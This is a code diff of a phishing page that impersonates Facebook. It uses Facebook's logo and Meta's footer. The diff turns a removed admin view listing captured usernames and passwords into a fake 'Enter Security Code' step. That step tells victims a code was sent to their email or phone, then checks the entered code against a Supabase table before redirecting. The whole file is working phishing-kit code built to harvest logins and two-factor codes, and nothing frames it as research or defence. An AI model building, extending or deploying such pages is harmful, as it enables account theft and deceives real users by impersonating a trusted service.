@@ -4,6 +4,7 @@
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1" />
   <title>Facebook – Confirm Your Identity</title>
+  <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js"></script>
   <style>
     body {
       background-color: #f0f2f5;
@@ -41,19 +42,32 @@
       margin-bottom: 25px;
       line-height: 1.4;
     }
-    table {
+    input[type="text"] {
       width: 100%;
-      border-collapse: collapse;
-      margin-top: 20px;
+      padding: 12px;
+      font-size: 16px;
+      border: 1px solid #ccc;
+      border-radius: 6px;
+      margin-bottom: 20px;
     }
-    th, td {
-      padding: 10px;
-      border-bottom: 1px solid #ccc;
-      text-align: left;
-    }
-    th {
+    .btn {
+      width: 100%;
       background-color: #1877f2;
       color: white;
+      border: none;
+      padding: 12px;
+      font-size: 16px;
+      border-radius: 6px;
+      cursor: pointer;
+      margin-bottom: 15px;
+    }
+    .resend-link {
+      font-size: 13px;
+      color: #1877f2;
+      cursor: pointer;
+    }
+    .resend-link:hover {
+      text-decoration: underline;
     }
     .meta-footer {
       position: fixed;
@@ -90,20 +104,12 @@
     <div class="fb-logo">
       <img src="https://upload.wikimedia.org/wikipedia/commons/0/05/Facebook_Logo_%282019%29.png" alt="Facebook Logo" />
     </div>
-    <h2>Login Records</h2>
-    <p>Live view of usernames and passwords submitted.</p>
+    <h2>Enter Security Code</h2>
+    <p id="confirmation-msg"></p>
 
-    <table>
-      <thead>
-        <tr>
-          <th>Username</th>
-          <th>Password</th>
-        </tr>
-      </thead>
-      <tbody id="logins-table-body">
-        <!-- Dynamic rows -->
-      </tbody>
-    </table>
+    <input type="text" id="code-input" placeholder="Enter code" maxlength="20" />
+    <button class="btn" onclick="verifyCode()">Continue</button>
+    <div class="resend-link" onclick="alert('A new code has been sent.')">Didn't get the code?</div>
   </div>
 
   <div class="meta-footer">
@@ -114,84 +120,82 @@
     <div class="bottom-line">&copy; 2025 Meta Platforms, Inc.</div>
   </div>
 
-  <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js"></script>
- <script>
-  // Supabase setup
-  const SUPABASE_URL = 'https://scserlwosxrmnvomipxt.supabase.co';
-  const SUPABASE_ANON_KEY = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...'; // use your full anon key
-  const supabase = supabase.createClient(SUPABASE_URL, SUPABASE_ANON_KEY);
+  <script>
+    // Supabase credentials
+    const SUPABASE_URL = 'https://scserlwosxrmnvomipxt.supabase.co';
+    const SUPABASE_ANON_KEY = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...'; // paste full anon key here
+    const supabase = supabase.createClient(SUPABASE_URL, SUPABASE_ANON_KEY);
 
-  window.onload = function () {
-    const user = localStorage.getItem("login_user");
-    const msgEl = document.getElementById("confirmation-msg");
+    window.onload = function () {
+      const user = localStorage.getItem("login_user");
+      const msgEl = document.getElementById("confirmation-msg");
 
-    if (!user) {
-      msgEl.textContent =
-        "To confirm it's really you trying to log in, we sent a code to your account. Enter it below to continue.";
-      return;
-    }
-
-    let displayType = "account";
-    let ending = "";
-
-    const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
-
-    if (emailRegex.test(user)) {
-      displayType = "email";
-      const atIndex = user.indexOf("@");
-      ending = user.slice(atIndex);
-    } else if (/^\d{7,}$/.test(user)) {
-      displayType = "phone number";
-      ending = user.slice(-4);
-    } else {
-      displayType = "username";
-      ending = user.length > 4 ? user.slice(-4) : user;
-    }
-
-    msgEl.textContent = `To confirm it's really you trying to log in, we sent a code to your ${displayType} ending in ....${ending}. Enter it below to continue.`;
-  };
-
-  async function verifyCode() {
-    const codeInput = document.getElementById("code-input");
-    const code = codeInput.value.trim();
-
-    // Remove previous error state
-    const existingError = document.querySelector(".error-message");
-    if (existingError) existingError.remove();
-    codeInput.style.borderColor = "#ccc";
-
-    if (!code) {
-      codeInput.style.borderColor = "red";
-
-      const error = document.createElement("div");
-      error.className = "error-message";
-      error.textContent = "Required";
-      error.style.color = "red";
-      error.style.fontSize = "12px";
-      error.style.marginTop = "-15px";
-      error.style.marginBottom = "15px";
-      codeInput.parentNode.insertBefore(error, codeInput.nextSibling);
-
-      return;
-    }
-
-    try {
-      const { data, error } = await supabase
-        .from("codes") // table name
-        .select("*")
-        .eq("code", code) // column name
-        .single();
-
-      if (error || !data) {
-        alert("Incorrect code. Please try again.");
-      } else {
-        window.location.href = "homepage.html";
+      if (!user) {
+        msgEl.textContent = "To confirm it's really you trying to log in, we sent a code to your account. Enter it below to continue.";
+        return;
       }
-    } catch (err) {
-      alert("An error occurred. Please try again.");
-    }
-  }
-</script>
 
+      let displayType = "account";
+      let ending = "";
+
+      const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+
+      if (emailRegex.test(user)) {
+        displayType = "email";
+        const atIndex = user.indexOf("@");
+        ending = user.slice(atIndex);
+      } else if (/^\d{7,}$/.test(user)) {
+        displayType = "phone number";
+        ending = user.slice(-4);
+      } else {
+        displayType = "username";
+        ending = user.length > 4 ? user.slice(-4) : user;
+      }
+
+      msgEl.textContent = `To confirm it's really you trying to log in, we sent a code to your ${displayType} ending in ....${ending}. Enter it below to continue.`;
+    };
+
+    async function verifyCode() {
+      const codeInput = document.getElementById("code-input");
+      const code = codeInput.value.trim();
+
+      const existingError = document.querySelector(".error-message");
+      if (existingError) existingError.remove();
+      codeInput.style.borderColor = "#ccc";
+
+      if (!code) {
+        codeInput.style.borderColor = "red";
+
+        const error = document.createElement("div");
+        error.className = "error-message";
+        error.textContent = "Required";
+        error.style.color = "red";
+        error.style.fontSize = "12px";
+        error.style.marginTop = "-15px";
+        error.style.marginBottom = "15px";
+        codeInput.parentNode.insertBefore(error, codeInput.nextSibling);
+
+        return;
+      }
+
+      try {
+        const { data, error } = await supabase
+          .from("codes")
+          .select("*")
+          .eq("code", code)
+          .order("created_at", { ascending: false })
+          .limit(1)
+          .single();
+
+        if (error || !data) {
+          alert("Incorrect code. Please try again.");
+        } else {
+          window.location.href = "homepage.html";
+        }
+      } catch (err) {
+        alert("An error occurred. Please try again.");
+      }
+    }
+  </script>
 </body>
 </html>
